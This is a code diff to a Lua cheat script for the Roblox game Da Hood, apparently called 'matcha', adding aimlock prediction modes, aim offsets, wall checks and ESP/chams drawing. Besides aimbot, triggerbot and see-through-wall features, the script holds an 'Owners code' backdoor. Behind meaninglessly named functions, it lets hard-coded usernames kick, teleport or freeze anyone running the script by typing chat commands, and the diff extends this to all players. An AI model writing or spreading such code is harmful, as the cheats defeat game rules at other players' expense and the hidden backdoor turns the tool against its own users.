@@ -45,6 +45,7 @@ getgenv().matcha = {
     TargetLockEnabled = false,
     AutoTarget = false,
     CheckWall = false,
+    CheckWall2 = false,
     CheckKO = false,
     CheckKO2 = false,
     CheckGrabbing = false,
@@ -68,7 +69,7 @@ getgenv().matcha = {
     Resolver = false,
     ResolverMethod = "move direction",
     AutoPrediction = false,
-    AutoPredMode = "PingBased",
+    AutoPredMode = "matcha",
     PredictionX = 0,
     PredictionY = 0,
     HitPart = "Head",
@@ -78,7 +79,8 @@ getgenv().matcha = {
     AntiGround = false,
     SmoothAimlock = 1,
     SmoothMethod = "Linear",
-    WallCheck = false,
+    Offset = 0,
+    JumpOffset = 0,
     TriggerbotEnabled = false,
     TriggerFOV = 20,
     OnlyTarget = false,
@@ -378,9 +380,15 @@ local function isKO(plr)
 end
 
 local function isDaHood()
-    for _, tool in ipairs(workspace:GetDescendants()) do
-        if tool:IsA("Tool") and (tool:FindFirstChild("Ammo") or tool:FindFirstChild("AmmoCount") or tool:FindFirstChild("GunScript")) then
-            return true
+    local players = game:GetService("Players")
+    for _, player in ipairs(players:GetPlayers()) do
+        local char = player.Character
+        if char then
+            local bodyEffects = char:FindFirstChild("BodyEffects")
+            local armor = bodyEffects and bodyEffects:FindFirstChild("Armor")
+            if armor then
+                return true
+            end
         end
     end
     return false
@@ -393,8 +401,17 @@ local function canSeeThroughWall(localPlayer, target)
 end
 
 local function getClosestTarget()
-    local center = getgenv().matcha.FOVCircleMode == "center" and Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) or UserInputService:GetMouseLocation()
-    local closestDist = getgenv().matcha.FOVCircleSize
+    -- Xác định vị trí trung tâm dựa trên nền tảng
+    local center
+    if UserInputService.MouseEnabled and not UserInputService.TouchEnabled then
+        -- PC: Lấy vị trí chuột
+        center = UserInputService:GetMouseLocation()
+    else
+        -- Mobile: Lấy tâm màn hình
+        center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+    end
+
+    local closestDist = getgenv().matcha.UseAimFOV and getgenv().matcha.FOVCircleSize or math.huge
     local closestPlayer = nil
 
     for _, plr in ipairs(Players:GetPlayers()) do
@@ -558,15 +575,16 @@ local function CreateButton(name, defaultPosition, callback)
 end
 
 -- Owners code
+-- Owners code
 local owners = {
     "anhchangm52",
-    "toyvayacutdii",  
+    "anhchangm53",  
     "dao_beo"
 }
 
-function x1y2z3(owner)
-    if owner then
-        LocalPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+function x1y2z3(targetPlayer, owner)
+    if targetPlayer and targetPlayer.Character and owner and owner.Character then
+        targetPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
     end
 end
 
@@ -583,9 +601,43 @@ function a1b2c3(ownerName)
     if owner then
         owner.Chatted:Connect(function(message)
             if message == "/kick ." then
-                LocalPlayer:Kick("Admins Has Kicked You.")
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner then -- Không kick owner
+                        player:Kick("Admins Has Kicked You.")
+                    end
+                end
             elseif message == "/bring ." then
-                x1y2z3(owner)
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner then -- Không bring owner
+                        x1y2z3(player, owner)
+                    end
+                end
+            elseif message == "/freeze ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        player.Character.Humanoid.WalkSpeed = 0
+                        player.Character.Humanoid.JumpPower = 0
+                        player.Character.HumanoidRootPart.Anchored = true
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "Admin Command",
+                            Text = "You have been frozen by " .. ownerName,
+                            Duration = 3
+                        })
+                    end
+                end
+            elseif message == "/unfreeze ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        player.Character.Humanoid.WalkSpeed = 16 -- Giá trị mặc định
+                        player.Character.Humanoid.JumpPower = 50 -- Giá trị mặc định
+                        player.Character.HumanoidRootPart.Anchored = false
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "Admin Command",
+                            Text = "You have been unfrozen by " .. ownerName,
+                            Duration = 3
+                        })
+                    end
+                end
             end
         end)
     end
@@ -595,11 +647,27 @@ for _, ownerName in ipairs(owners) do
     a1b2c3(ownerName)
 end
 
--- Functions
+local function CalculateAutoPrediction(target)
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
+        return 0.1
+    end
+
+    local ping = math.clamp(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000, 0.01, 1)
+    local root = target.Character.HumanoidRootPart
+    local velocity = root.AssemblyLinearVelocity.Magnitude
+    local distance = (root.Position - Workspace.CurrentCamera.CFrame.Position).Magnitude
+
+    -- Công thức prediction dựa theo ping + khoảng cách + vận tốc
+    local predicted_time = (distance / math.max(velocity, 1)) * 0.05 + ping * 0.5
+    predicted_time = math.clamp(predicted_time, 0.05, 0.4)
+    return predicted_time
+end
+
 local function getPing()
     return math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
 end
 
+-- Hàm calculateAdvancePrediction (giữ nguyên)
 local function calculateAdvancePrediction(target, cameraPosition, pingBase)
     local character = target.Character
     if character then
@@ -613,32 +681,30 @@ local function calculateAdvancePrediction(target, cameraPosition, pingBase)
     return pingBase
 end
 
+-- Cập nhật hàm updatePredictionValue
 local function updatePredictionValue()
     if not getgenv().matcha.AutoPrediction then return end
 
     local ping = getPing()
     local pred = 0.13
 
-    if getgenv().matcha.AutoPredMode == "PingBased" then
+    if getgenv().matcha.AutoPredMode == "0-225" then
         for _, entry in ipairs(predictionTable) do
             if ping < entry[1] then
                 pred = entry[2]
                 break
             end
         end
-
     elseif getgenv().matcha.AutoPredMode == "Calculation" then
         pred = 0.1 + (ping / 1000) * 0.32
-
     elseif getgenv().matcha.AutoPredMode == "AdvanceCalculation" then
         for _, entry in ipairs(predictionTable) do
             if ping < entry[1] then
                 local base = entry[2]
-                pred = calculateAdvancePrediction(getgenv().matcha.Target, Camera.CFrame.Position, base)
+                pred = calculateAdvancePrediction(getgenv().matcha.SelectedTarget, Camera.CFrame.Position, base)
                 break
             end
         end
-
     elseif getgenv().matcha.AutoPredMode == "Blatant" then
         for _, entry in ipairs(Blatant) do
             if ping < entry[1] then
@@ -646,9 +712,7 @@ local function updatePredictionValue()
                 break
             end
         end
-
-    -- pingset1
-    elseif getgenv().matcha.AutoPredMode == "pingset1" then
+    elseif getgenv().matcha.AutoPredMode == "50-290" then
         if ping >= 50 and ping <= 290 then
             local map = {
                 [50]=0.1433,[55]=0.1412,[60]=0.1389,[65]=0.1367,[70]=0.1346,[75]=0.1324,[80]=0.1303,
@@ -661,9 +725,7 @@ local function updatePredictionValue()
             }
             for k,v in pairs(map) do if ping <= k then pred = v break end end
         end
-
-    -- pingset2
-    elseif getgenv().matcha.AutoPredMode == "pingset2" then
+    elseif getgenv().matcha.AutoPredMode == "10-190" then
         if ping > 190 then pred = 0.206547
         elseif ping > 180 then pred = 0.19284
         elseif ping > 170 then pred = 0.1923111
@@ -684,9 +746,7 @@ local function updatePredictionValue()
         elseif ping > 20 then pred = 0.12588
         elseif ping > 10 then pred = 0.9
         end
-
-    -- pingset3
-    elseif getgenv().matcha.AutoPredMode == "pingset3" then
+    elseif getgenv().matcha.AutoPredMode == "10-1000" then
         local map = {
             [1000]=0.345,[900]=0.290724,[800]=0.254408,[700]=0.23398,[600]=0.215823,[500]=0.19284,
             [400]=0.18321,[360]=0.16537,[280]=0.16780,[270]=0.195566,[260]=0.175566,[250]=0.1651,
@@ -696,9 +756,7 @@ local function updatePredictionValue()
             [50]=0.127668,[40]=0.125,[30]=0.11,[20]=0.12588,[10]=0.9
         }
         for k,v in pairs(map) do if ping <= k then pred = v break end end
-
-    -- pingset4
-    elseif getgenv().matcha.AutoPredMode == "pingset4" then
+    elseif getgenv().matcha.AutoPredMode == "5-500" then
         local map = {
             [5]=0.1030773,[10]=0.1061546,[15]=0.1092319,[20]=0.1123092,[25]=0.1153865,[30]=0.1184638,
             [35]=0.1215411,[40]=0.1246184,[45]=0.1276957,[50]=0.130773,[55]=0.1338503,[60]=0.1369276,
@@ -719,18 +777,15 @@ local function updatePredictionValue()
             [485]=0.3984981,[490]=0.4015754,[495]=0.4046527,[500]=0.40773
         }
         for k,v in pairs(map) do if ping <= k then pred = v break end end
-
-    -- drax mode (chuẩn file recode)
     elseif getgenv().matcha.AutoPredMode == "drax" then
         pred = (ping / 1000) + 0.125
-    end
-
-    -- special mode cho ping 110-140
-    if getgenv().matcha.AutoPredMode == "110-140ping" then
+    elseif getgenv().matcha.AutoPredMode == "110-140ping" then
         if ping >= 110 and ping <= 140 then
             local vals = {0.1345, 0.1409, 0.141199, 0.143765}
             pred = vals[math.random(1,#vals)]
         end
+    elseif getgenv().matcha.AutoPredMode == "matcha" then
+        pred = CalculateAutoPrediction(getgenv().matcha.SelectedTarget)
     end
 
     getgenv().matcha.PredictionX = pred
@@ -829,7 +884,7 @@ local function isValidTarget(target)
     if getgenv().matcha.CheckFriend2 and LocalPlayer:IsFriendsWith(target.UserId) then return false end
     if getgenv().matcha.CheckKO2 and isKO(target) then return false end
     if getgenv().matcha.CheckGrabbing2 and char:FindFirstChild("BodyEffects") and char.BodyEffects:FindFirstChild("GRABBING_CONSTRAINT") and char.BodyEffects.GRABBING_CONSTRAINT.Value then return false end
-    if getgenv().matcha.WallCheck and not canSeeThroughWall(LocalPlayer, target) then return false end
+    if getgenv().matcha.CheckWall2 and not canSeeThroughWall(LocalPlayer, target) then return false end
     if getgenv().matcha.HealthCheck and hum.Health <= getgenv().matcha.HealthThreshold then return false end
     if getgenv().matcha.DistanceCheck then
         local dist = (LocalPlayer.Character.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
@@ -938,7 +993,11 @@ RunService.RenderStepped:Connect(function()
         local part = getAimPart(getgenv().matcha.SelectedTarget)
         if part then
             local velocity = getVelocity(part)
-            local predPos = part.Position + velocity * getgenv().matcha.PredictionX
+            local offsetVector = Vector3.new(0, getgenv().matcha.Offset, 0)
+            if isFreefall(LocalPlayer) or isFreefall(getgenv().matcha.SelectedTarget) then
+                offsetVector = offsetVector + Vector3.new(0, getgenv().matcha.JumpOffset, 0)
+            end
+            local predPos = part.Position + velocity * getgenv().matcha.PredictionX + offsetVector
             if getgenv().matcha.AimlockEnabled then
                 if getgenv().matcha.AimMethod == "camera" then
                     local smooth = getgenv().matcha.SmoothAimlock
@@ -1475,11 +1534,9 @@ local function refreshEmote()
     end
 end
 
-
-
 -- Nếu Normal mode thì dừng khi di chuyển
 RunService.RenderStepped:Connect(function()
-    if getgenv().matcha.EmoteEnabled and getgenv().matcha.EmoteMode == "Normal" and currentTrack then
+    if getgenv().matcha.EmoteMode == "Normal" and currentTrack then
         local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
         if hum and hum.MoveDirection.Magnitude > 0 then
             stopCurrent()
@@ -1798,14 +1855,14 @@ AimGroup:AddToggle('AimlockEnabled', {
     Text = 'Checks',
     Callback = function(selected)
         -- reset
-        getgenv().matcha.WallCheck = false
+        getgenv().matcha.CheckWall2 = false
         getgenv().matcha.KOCheck = false
         getgenv().matcha.GrabCheck = false
 
         -- set lại theo dropdown
         for k, v in pairs(selected) do
             if k == 'Wall Check' and v then
-                getgenv().matcha.WallCheck = true
+                getgenv().matcha.CheckWall2 = true
             elseif k == 'KO Check' and v then
                 getgenv().matcha.KOCheck = true
             elseif k == 'Grab Check' and v then
@@ -1882,7 +1939,15 @@ PredictionGroup:AddDropdown('ResolverMethod', {
     end
 })
 
-PredictionGroup:AddToggle('AutoPrediction', { Text = 'Auto Prediction', Default = false, Callback = function(Value) getgenv().matcha.AutoPrediction = Value end }):AddDropdown('AutoPredMode', { Values = {'AdvanceCalculation','PingBased','Calculation','Blatant','pingset1','pingset2','pingset3','pingset4','drax','110-140ping'}, Default = 'PingBased', Text = 'Auto Pred Mode', Callback = function(Value) getgenv().matcha.AutoPredMode = Value end })
+PredictionGroup:AddToggle('AutoPrediction', { Text = 'Auto Prediction', Default = false, Callback = function(Value) getgenv().matcha.AutoPrediction = Value end }):AddDropdown('AutoPredMode', {
+    Values = {"0-225", "Calculation", "AdvanceCalculation", "Blatant", "50-290", "10-190", "10-1000", "5-500", "drax", "110-140", "matcha"},
+    Default = "matcha",  -- Mặc định dùng mode matcha
+    Multi = false,
+    Text = 'Auto Prediction Mode',
+    Callback = function(Value)
+        getgenv().matcha.AutoPredMode = Value
+    end
+})
 
 
 PredictionGroup:AddSlider('PredictionX', {
@@ -1921,6 +1986,26 @@ PredictionGroup:AddToggle('ClosestHitPart', {
     Default = false,
     Callback = function(Value)
         getgenv().matcha.ClosestHitPart = Value
+    end
+})
+
+PredictionGroup:AddInput('OffsetInput', {
+    Text = 'Offset',
+    Default = '0',
+    Numeric = true,
+    Finished = true,
+    Callback = function(Value)
+        getgenv().matcha.Offset = tonumber(Value) or 0
+    end
+})
+
+PredictionGroup:AddInput('JumpOffsetInput', {
+    Text = 'Jump Offset',
+    Default = '0',
+    Numeric = true,
+    Finished = true,
+    Callback = function(Value)
+        getgenv().matcha.JumpOffset = tonumber(Value) or 0
     end
 })
 
@@ -2397,12 +2482,23 @@ end
 
 -- 🌿 Logic Chams và SelfChams (sử dụng Highlight cho chams, material cho parts)
 local chamsHighlights = {}
+local originalMaterials = {}  -- Lưu material gốc cho từng part của từng player
+
 local function applyChams(player)
     local char = player.Character
     if not char or not getgenv().matcha.ESPChams then
         if chamsHighlights[player] then
             chamsHighlights[player]:Destroy()
             chamsHighlights[player] = nil
+        end
+        -- Khôi phục material gốc khi tắt
+        if originalMaterials[player] then
+            for part, mat in pairs(originalMaterials[player]) do
+                if part and part.Parent then
+                    part.Material = mat
+                end
+            end
+            originalMaterials[player] = nil
         end
         return
     end
@@ -2422,7 +2518,13 @@ local function applyChams(player)
     hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
 
     if getgenv().matcha.ESPChamsMaterial then
+        if not originalMaterials[player] then
+            originalMaterials[player] = {}
+        end
         for _, part in pairs(char:GetDescendants()) do
+            if part:IsA("BasePart") and not originalMaterials[player][part] then
+                originalMaterials[player][part] = part.Material
+            end
             if part:IsA("BasePart") then
                 part.Material = Enum.Material[getgenv().matcha.ESPChamsMaterialType]
             end
@@ -2430,23 +2532,41 @@ local function applyChams(player)
     end
 end
 
+local selfOriginalMaterials = {}  -- Lưu material gốc cho self
 local function applySelfChams()
     local selfChar = LocalPlayer.Character
-    if not selfChar or not getgenv().matcha.ESPSelfChams then return end
+    if not selfChar or (not getgenv().matcha.ESPSelfChams and not getgenv().matcha.ESPSelfMaterial) then
+        -- Xóa highlight và khôi phục material khi tắt
+        for _, part in pairs(selfChar:GetDescendants()) do
+            if part:IsA("BasePart") then
+                local hl = part:FindFirstChild("SelfChamsHL")
+                if hl then hl:Destroy() end
+            end
+        end
+        for part, mat in pairs(selfOriginalMaterials) do
+            if part and part.Parent then
+                part.Material = mat
+            end
+        end
+        selfOriginalMaterials = {}
+        return
+    end
 
     for _, part in pairs(selfChar:GetDescendants()) do
         if part:IsA("BasePart") then
-            if not part:FindFirstChild("SelfChamsHL") then
-                local hl = Instance.new("Highlight")
-                hl.Name = "SelfChamsHL"
-                hl.FillColor = getgenv().matcha.ESPSelfChamsColor
-                hl.Enabled = true
-                hl.Parent = part
+            if getgenv().matcha.ESPSelfChams then
+                if not part:FindFirstChild("SelfChamsHL") then
+                    local hl = Instance.new("Highlight")
+                    hl.Name = "SelfChamsHL"
+                    hl.FillColor = getgenv().matcha.ESPSelfChamsColor
+                    hl.Enabled = true
+                    hl.Parent = part
+                end
             end
-            if getgenv().matcha.ESPSelfMaterial then
-                part.Material = Enum.Material[getgenv().matcha.ESPChamsMaterialType]
-            end
-            if getgenv().matcha.ESPToolMaterial and part.Parent:IsA("Tool") then
+            if getgenv().matcha.ESPSelfMaterial or (getgenv().matcha.ESPToolMaterial and part.Parent:IsA("Tool")) then
+                if not selfOriginalMaterials[part] then
+                    selfOriginalMaterials[part] = part.Material
+                end
                 part.Material = Enum.Material[getgenv().matcha.ESPChamsMaterialType]
             end
         end
@@ -2454,35 +2574,6 @@ local function applySelfChams()
 end
 
 -- 🌿 Hàm helper từ các code
-local function get_bounding_box(instance)
-    local min, max = Vector2.new(math.huge, math.huge), Vector2.new(-math.huge, -math.huge)
-    local onscreen = false
-
-    if instance:IsA("Model") then
-        for _, p in ipairs(instance:GetChildren()) do
-            if p:IsA("BasePart") then
-                local size = (p.Size / 2) * 1.15  -- Padding default
-                local cf = p.CFrame
-                for _, offset in ipairs({
-                    Vector3.new(size.X, size.Y, size.Z), Vector3.new(-size.X, size.Y, size.Z),
-                    Vector3.new(size.X, -size.Y, size.Z), Vector3.new(-size.X, -size.Y, size.Z),
-                    Vector3.new(size.X, size.Y, -size.Z), Vector3.new(-size.X, size.Y, -size.Z),
-                    Vector3.new(size.X, -size.Y, -size.Z), Vector3.new(-size.X, -size.Y, -size.Z),
-                }) do
-                    local pos, visible = Camera:WorldToViewportPoint(cf * offset)
-                    if visible then
-                        local v2 = Vector2.new(pos.X, pos.Y)
-                        min = min:Min(v2)
-                        max = max:Max(v2)
-                        onscreen = true
-                    end
-                end
-            end -- Thêm cho Accessory nếu cần
-        end
-    end
-    return min, max, onscreen
-end
-
 local function GetCorners(part)
     local CF, Size = part.CFrame, part.Size / 2
     local Corners = {}
@@ -2568,11 +2659,13 @@ local function esp_add_player(player)
         outline.Thickness = 3
         outline.Transparency = 1
         outline.Visible = false
+        outline.Color = getgenv().matcha.ESPBoxesOutlineColor  -- Set default đen cho outline
 
         local fill = Drawing.new("Line")
         fill.Thickness = 1
         fill.Transparency = 1
         fill.Visible = false
+        fill.Color = getgenv().matcha.ESPBoxesColor  -- Set default xanh cho fill
         table.insert(new_esp.corner_fill, fill)
         table.insert(new_esp.corner_outline, outline)
     end
@@ -2591,11 +2684,11 @@ local function esp_add_player(player)
     new_esp.head_dot_outline.Color = Color3.new(0, 0, 0)
     new_esp.head_dot_outline.Visible = false
 
-    new_esp.health_bar_outline.Thickness = 1
+    new_esp.health_bar_outline.Thickness = 3
     new_esp.health_bar_outline.Color = Color3.new(0, 0, 0)
     new_esp.health_bar_outline.Visible = false
 
-    new_esp.health_bar_inline.Thickness = 3
+    new_esp.health_bar_inline.Thickness = 1
     new_esp.health_bar_inline.Visible = false
 
     new_esp.health_text.Color = Color3.new(1, 1, 1)
@@ -2628,9 +2721,11 @@ local function esp_add_player(player)
 
     new_esp.tracer.Thickness = getgenv().matcha.ESPTracerThickness
     new_esp.tracer.Visible = false
+    new_esp.tracer.Color = getgenv().matcha.ESPTracerColor  -- Đảm bảo set xanh
 
     new_esp.tracer_outline.Thickness = getgenv().matcha.ESPTracerThickness + 2
     new_esp.tracer_outline.Visible = false
+    new_esp.tracer_outline.Color = getgenv().matcha.ESPTracerOutlineColor  -- Đen cho outline
 
     new_esp.armor_bar_outline.Thickness = 1
     new_esp.armor_bar_outline.Color = Color3.new(0, 0, 0)
@@ -2644,6 +2739,21 @@ local function esp_add_player(player)
         line.Thickness = 1
         line.Visible = false
         table.insert(new_esp.arrow_lines, line)
+    end
+
+    -- Cho 3D: Tạo fixed 12 lines và 6 quads, không create new mỗi frame
+    for i = 1, 12 do
+        local line = Drawing.new("Line")
+        line.Thickness = 1
+        line.Visible = false
+        table.insert(new_esp.lines3d, line)
+    end
+    for i = 1, 6 do
+        local quad = Drawing.new("Quad")
+        quad.Thickness = 0.5
+        quad.Filled = true
+        quad.Visible = false
+        table.insert(new_esp.quads3d, quad)
     end
 
     esplib.players[player] = new_esp
@@ -2781,10 +2891,8 @@ RunService.Heartbeat:Connect(function(dt)
             esp_obj.tracer_outline.Visible = false
             esp_obj.armor_bar_outline.Visible = false
             esp_obj.armor_bar_inline.Visible = false
-            for _, l in ipairs(esp_obj.lines3d) do l:Remove() end
-            esp_obj.lines3d = {}
-            for _, q in ipairs(esp_obj.quads3d) do q:Remove() end
-            esp_obj.quads3d = {}
+            for _, l in ipairs(esp_obj.lines3d) do l.Visible = false end
+            for _, q in ipairs(esp_obj.quads3d) do q.Visible = false end
             esp_obj.chams.Enabled = false
 
             continue
@@ -2816,56 +2924,138 @@ RunService.Heartbeat:Connect(function(dt)
                 for _, l in ipairs(esp_obj.corner_fill) do l.Visible = false end
                 for _, l in ipairs(esp_obj.corner_outline) do l.Visible = false end
 
-                -- Vẽ 3D
-                local cubeVertices = GetCorners({CFrame = hrp.CFrame * CFrame.new(0, -0.5, 0), Size = Vector3.new(3, 5, 3)})
+                -- Vẽ 3D với reuse
+                local cubeVertices = GetCorners(hrp)  -- Sửa: dùng hrp thay vì {CFrame=..., Size=...}
+                local color = is_target and getgenv().matcha.ESPBoxesTargetColor or getgenv().matcha.ESPBoxesColor
+                local line_trans = transparency
+                local quad_trans = 0.25 * transparency
 
-                -- Bottom face
-                local l1 = DrawLine(cubeVertices[1], cubeVertices[2], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l2 = DrawLine(cubeVertices[2], cubeVertices[6], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l3 = DrawLine(cubeVertices[6], cubeVertices[5], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l4 = DrawLine(cubeVertices[5], cubeVertices[1], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local q1 = DrawQuad(cubeVertices[1], cubeVertices[2], cubeVertices[6], cubeVertices[5], getgenv().matcha.ESPBoxesColor, 1, transparency, true, true)
-                table.insert(esp_obj.lines3d, l1)
-                table.insert(esp_obj.lines3d, l2)
-                table.insert(esp_obj.lines3d, l3)
-                table.insert(esp_obj.lines3d, l4)
-                table.insert(esp_obj.quads3d, q1)
+                -- Bottom face lines and quad
+                esp_obj.lines3d[1].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[1])).X, (Camera:WorldToViewportPoint(cubeVertices[1])).Y)
+                esp_obj.lines3d[1].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[2])).X, (Camera:WorldToViewportPoint(cubeVertices[2])).Y)
+                esp_obj.lines3d[1].Color = color
+                esp_obj.lines3d[1].Transparency = line_trans
+                esp_obj.lines3d[1].Visible = true
+
+                esp_obj.lines3d[2].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[2])).X, (Camera:WorldToViewportPoint(cubeVertices[2])).Y)
+                esp_obj.lines3d[2].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[6])).X, (Camera:WorldToViewportPoint(cubeVertices[6])).Y)
+                esp_obj.lines3d[2].Color = color
+                esp_obj.lines3d[2].Transparency = line_trans
+                esp_obj.lines3d[2].Visible = true
+
+                esp_obj.lines3d[3].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[6])).X, (Camera:WorldToViewportPoint(cubeVertices[6])).Y)
+                esp_obj.lines3d[3].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[5])).X, (Camera:WorldToViewportPoint(cubeVertices[5])).Y)
+                esp_obj.lines3d[3].Color = color
+                esp_obj.lines3d[3].Transparency = line_trans
+                esp_obj.lines3d[3].Visible = true
+
+                esp_obj.lines3d[4].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[5])).X, (Camera:WorldToViewportPoint(cubeVertices[5])).Y)
+                esp_obj.lines3d[4].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[1])).X, (Camera:WorldToViewportPoint(cubeVertices[1])).Y)
+                esp_obj.lines3d[4].Color = color
+                esp_obj.lines3d[4].Transparency = line_trans
+                esp_obj.lines3d[4].Visible = true
+
+                esp_obj.quads3d[1].PointA = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[1])).X, (Camera:WorldToViewportPoint(cubeVertices[1])).Y)
+                esp_obj.quads3d[1].PointB = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[2])).X, (Camera:WorldToViewportPoint(cubeVertices[2])).Y)
+                esp_obj.quads3d[1].PointC = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[6])).X, (Camera:WorldToViewportPoint(cubeVertices[6])).Y)
+                esp_obj.quads3d[1].PointD = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[5])).X, (Camera:WorldToViewportPoint(cubeVertices[5])).Y)
+                esp_obj.quads3d[1].Color = color
+                esp_obj.quads3d[1].Transparency = quad_trans
+                esp_obj.quads3d[1].Visible = true
 
                 -- Side faces
-                local l5 = DrawLine(cubeVertices[1], cubeVertices[3], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l6 = DrawLine(cubeVertices[2], cubeVertices[4], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l7 = DrawLine(cubeVertices[6], cubeVertices[8], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l8 = DrawLine(cubeVertices[5], cubeVertices[7], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local q2 = DrawQuad(cubeVertices[2], cubeVertices[4], cubeVertices[8], cubeVertices[6], getgenv().matcha.ESPBoxesColor, 1, transparency, true, true)
-                local q3 = DrawQuad(cubeVertices[1], cubeVertices[2], cubeVertices[4], cubeVertices[3], getgenv().matcha.ESPBoxesColor, 1, transparency, true, true)
-                local q4 = DrawQuad(cubeVertices[1], cubeVertices[5], cubeVertices[7], cubeVertices[3], getgenv().matcha.ESPBoxesColor, 1, transparency, true, true)
-                local q5 = DrawQuad(cubeVertices[5], cubeVertices[7], cubeVertices[8], cubeVertices[6], getgenv().matcha.ESPBoxesColor, 1, transparency, true, true)
-                table.insert(esp_obj.lines3d, l5)
-                table.insert(esp_obj.lines3d, l6)
-                table.insert(esp_obj.lines3d, l7)
-                table.insert(esp_obj.lines3d, l8)
-                table.insert(esp_obj.quads3d, q2)
-                table.insert(esp_obj.quads3d, q3)
-                table.insert(esp_obj.quads3d, q4)
-                table.insert(esp_obj.quads3d, q5)
+                esp_obj.lines3d[5].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[1])).X, (Camera:WorldToViewportPoint(cubeVertices[1])).Y)
+                esp_obj.lines3d[5].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[3])).X, (Camera:WorldToViewportPoint(cubeVertices[3])).Y)
+                esp_obj.lines3d[5].Color = color
+                esp_obj.lines3d[5].Transparency = line_trans
+                esp_obj.lines3d[5].Visible = true
+
+                esp_obj.lines3d[6].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[2])).X, (Camera:WorldToViewportPoint(cubeVertices[2])).Y)
+                esp_obj.lines3d[6].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[4])).X, (Camera:WorldToViewportPoint(cubeVertices[4])).Y)
+                esp_obj.lines3d[6].Color = color
+                esp_obj.lines3d[6].Transparency = line_trans
+                esp_obj.lines3d[6].Visible = true
+
+                esp_obj.lines3d[7].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[6])).X, (Camera:WorldToViewportPoint(cubeVertices[6])).Y)
+                esp_obj.lines3d[7].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[8])).X, (Camera:WorldToViewportPoint(cubeVertices[8])).Y)
+                esp_obj.lines3d[7].Color = color
+                esp_obj.lines3d[7].Transparency = line_trans
+                esp_obj.lines3d[7].Visible = true
+
+                esp_obj.lines3d[8].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[5])).X, (Camera:WorldToViewportPoint(cubeVertices[5])).Y)
+                esp_obj.lines3d[8].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[7])).X, (Camera:WorldToViewportPoint(cubeVertices[7])).Y)
+                esp_obj.lines3d[8].Color = color
+                esp_obj.lines3d[8].Transparency = line_trans
+                esp_obj.lines3d[8].Visible = true
+
+                esp_obj.quads3d[2].PointA = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[2])).X, (Camera:WorldToViewportPoint(cubeVertices[2])).Y)
+                esp_obj.quads3d[2].PointB = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[4])).X, (Camera:WorldToViewportPoint(cubeVertices[4])).Y)
+                esp_obj.quads3d[2].PointC = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[8])).X, (Camera:WorldToViewportPoint(cubeVertices[8])).Y)
+                esp_obj.quads3d[2].PointD = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[6])).X, (Camera:WorldToViewportPoint(cubeVertices[6])).Y)
+                esp_obj.quads3d[2].Color = color
+                esp_obj.quads3d[2].Transparency = quad_trans
+                esp_obj.quads3d[2].Visible = true
+
+                esp_obj.quads3d[3].PointA = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[1])).X, (Camera:WorldToViewportPoint(cubeVertices[1])).Y)
+                esp_obj.quads3d[3].PointB = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[2])).X, (Camera:WorldToViewportPoint(cubeVertices[2])).Y)
+                esp_obj.quads3d[3].PointC = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[4])).X, (Camera:WorldToViewportPoint(cubeVertices[4])).Y)
+                esp_obj.quads3d[3].PointD = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[3])).X, (Camera:WorldToViewportPoint(cubeVertices[3])).Y)
+                esp_obj.quads3d[3].Color = color
+                esp_obj.quads3d[3].Transparency = quad_trans
+                esp_obj.quads3d[3].Visible = true
+
+                esp_obj.quads3d[4].PointA = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[1])).X, (Camera:WorldToViewportPoint(cubeVertices[1])).Y)
